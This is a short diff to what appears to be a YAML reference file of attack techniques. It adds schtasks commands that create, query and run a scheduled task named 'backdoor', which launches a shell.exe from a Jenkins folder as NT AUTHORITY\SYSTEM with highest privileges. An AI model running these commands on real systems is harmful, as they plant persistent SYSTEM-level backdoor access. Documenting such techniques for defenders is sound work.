@@ -22,6 +22,12 @@ functions:
         Run Task:
         Start-ScheduledTask -TaskName backdoor
 
+
+        schtasks /CREATE /RU "NT AUTHORITY\SYSTEM" /SC once /TR "C:\Program Files (x86)\Jenkins\shell.exe" /ST 01:57 /TN backdoor /RL HIGHEST /F
+        schtasks /QUERY /TN backdoor
+        schtasks /RUN /TN backdoor
+
+
 resources : |
 
 ---
